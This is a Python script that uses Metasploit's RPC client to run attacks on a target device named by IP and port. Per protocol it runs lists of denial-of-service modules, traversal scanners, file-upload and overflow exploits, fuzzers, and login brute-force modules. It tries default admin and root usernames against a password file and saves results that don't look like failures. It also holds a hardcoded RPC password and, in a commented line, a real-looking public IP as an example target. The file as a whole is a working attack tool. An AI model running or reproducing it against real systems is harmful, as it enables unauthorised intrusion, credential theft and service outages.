from pymetasploit3.msfrpc import MsfRpcClient
import re
import sys
import signal
import random
from contextlib import contextmanager

class TimeoutException(Exception): pass

@contextmanager
def time_limit(seconds):
    def signal_handler(signum, frame):
        raise TimeoutException
    signal.signal(signal.SIGALRM, signal_handler)
    signal.alarm(seconds)
    try:
        yield
    finally:
        signal.alarm(0)

http_module=['dos/http/apache_commons_fileupload_dos','dos/http/apache_mod_isapi','dos/http/apache_range_dos',
             'dos/http/apache_tomcat_transfer_encoding','dos/http/metasploit_httphandler_dos','dos/http/slowloris',
             'admin/http/tomcat_utf8_traversal','scanner/http/http_traversal',
             'scanner/http/httpdasm_directory_traversal','scanner/http/simple_webserver_traversal','scanner/http/backup_file',
             'scanner/http/copy_of_file','scanner/http/file_same_name_dir','scanner/http/files_dir','multi/http/sit_file_upload',
             'scanner/http/http_login']

ftp_module=['scanner/ftp/anonymous']#,'fuzzers/ftp/ftp_pre_post','scanner/ftp/ftp_login']

telnet_module=['scanner/telnet/telnet_ruggedcom','scanner/telnet/telnet_login',
               'scanner/telnet/telnet_encrypt_overflow','linux/telnet/telnet_encrypt_keyid','solaris/telnet/fuser'
               ,'solaris/telnet/ttyprompt']

ssh_module=['multi/ssh/sshexec','fuzzers/ssh/ssh_kexinit_corrupt','fuzzers/ssh/ssh_version_corrupt','fuzzers/ssh/ssh_version_15',
            'fuzzers/ssh/ssh_version_2','scanner/ssh/ssh_enumusers',
            'scanner/ssh/ssh_login']

snmp_module=['scanner/snmp/snmp_enum','scanner/snmp/snmp_enumshares','scanner/snmp/snmp_enumusers','scanner/snmp/snmp_login']
def deviceTest(Protocol,IP,filepath,passwordFile):
    passwords=[]
    with open(passwordFile,'r') as f:
        list=f.readlines()
        for line in list:
            passwords.append(line)
    modules=[]
    ipinfo = IP.split(":")
    ip = ipinfo[0]
    port = ipinfo[1]
    if(Protocol=="http"):
        modules=http_module
    elif Protocol=="ftp":
        modules=ftp_module
    elif Protocol=="telnet":
        modules=telnet_module
    elif Protocol=="ssh":
        modules=ssh_module
    elif Protocol=="snmp":
        modules=snmp_module

    client = MsfRpcClient('chinazfz')
    path =None
    user = ['admin', 'administrator', 'Admin', 'Administrator', 'root']
    for module in modules:
        count=0
        if module in client.modules.auxiliary:
            path='auxiliary'
        elif module in client.modules.exploits:
            path='exploit'

        exploit = client.modules.use(path, module)

        useUsr = False
        usePass = False
        usePassFile = False
        useUsrFile=False
        print(module)
        print(exploit.options)
        for temp in exploit.options:
            #print('required:' + temp)
            if (re.search('FTPUSER', temp)):
                useUsr = True
            if (re.search('FTPPASS', temp)):
                usePass = True
            if (re.search('RHOSTS', temp)):
                exploit[temp] = ip
            if (re.search('RPORT', temp)):
                exploit[temp] = port
            if(re.search('rhost',temp)):
                exploit[temp]=ip
            if(re.search('USERNAME',temp)):
                useUsr=True
            if(re.search('PASSWORD',temp)):
                usePass=True
            if(re.search('PASS_FILE',temp)):
                usePassFile=True
            if(re.search('VERBOSE',temp)):
                exploit[temp]=True
        print(useUsr)
        print(usePassFile)
        print(usePass)
        if useUsr==True:
            for usr in user:
                if 'FTPUSER' in exploit.options:
                    exploit['FTPUSER']=usr
                elif 'USERNAME' in exploit.options:
                    exploit['USERNAME']=usr
                if not usePassFile and usePass:
                    for password in passwords:
                        if 'FTPPASS' in exploit.options:
                            exploit['FTPPASS'] = password
                        elif 'PASSWORD' in exploit.options:
                            exploit['PASSWORD'] = password
                        #print(exploit['USERNAME']+":"+exploit['PASSWORD'])
                        try:
                            cid=client.consoles.console().cid
                            with time_limit(100):
                                # if(path=='exploit'):
                                #     payloads=exploit.targetpayloads()
                                #     for pl in payloads:
                                #         payload=client.modules.use('payload',pl)
                                #         #result = client.consoles.console(cid).run_module_with_output(exploit,payload=pl)
                                #         result = client.consoles.console(cid).run_module_with_output(exploit)
                                #         print(result)
                                result=client.consoles.console(cid).run_module_with_output(exploit)
                                print(result)
                            if re.search('fail',result) or re.search('Fail',result) or re.search('FAIL',result)or re.search('reject',result):
                                pass
                            else:
                                m = module.split('/')[-1]
                                Path=filepath+'/'+m+'_'+str(count)+'.txt'
                                count=count+1

                                with open(Path,'w') as f:
                                    writeline = "{\"ip\":\"" + IP + "\"," + "\"protocol\":\"" + Protocol+ "\"," + "\"module\":\"" + \
                                                path + "/" + module + "\"," + "\"result\":\"" + result + "\"}\n"
                                    f.write(writeline)
                                    f.close()
                                print(result)
                        except Exception as e:
                            print(e)
                elif usePassFile:
                    exploit['PASS_FILE']=passwordFile
                    try:
                        cid=client.consoles.console().cid
                        with time_limit(100):
                            result = client.consoles.console(cid).run_module_with_output(exploit)
                            print(result)
                        if re.search('fail', result) or re.search('Fail', result) or re.search('FAIL', result) or re.search('reject',result):
                            pass
                        else:

                            m = module.split('/')[-1]
                            Path = filepath +'/' +m + '_' + str(count) + '.txt'
                            count = count + 1

                            with open(Path, 'w') as f:
                                writeline = "{\"ip\":\"" + IP + "\"," + "\"protocol\":\"" + Protocol + "\"," + "\"module\":\"" + \
                                            path + "/" + module + "\"," + "\"result\":\"" + result + "\"}\n"
                                f.write(writeline)
                                f.close()
                            print(result)
                    except Exception as e:
                        print(e)
        else:
            try:
                cid = client.consoles.console().cid

                result = client.consoles.console(cid).run_module_with_output(exploit)
                m = module.split('/')[-1]
                Path = filepath + '/' + m + '_' + str(count) + '.txt'
                count = count + 1
                print(result)
                with open(Path, 'w') as f:
                    writeline = "{\"ip\":\"" + IP + "\"," + "\"protocol\":\"" + Protocol + "\"," + "\"module\":\"" + \
                                path + "/" + module + "\"," + "\"result\":\"" + result + "\"}\n"
                    f.write(writeline)
                    f.close()
                print(result)
            except Exception as e:
                print(e)

if __name__=='__main__':
    if len(sys.argv)>1:
        deviceTest(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4])
    #deviceTest('ssh','174.90.217.211:22','/Users/ludam/Desktop/MetasploitResult/ssh','/Users/ludam/Desktop/final/ScanScript/PassWord')
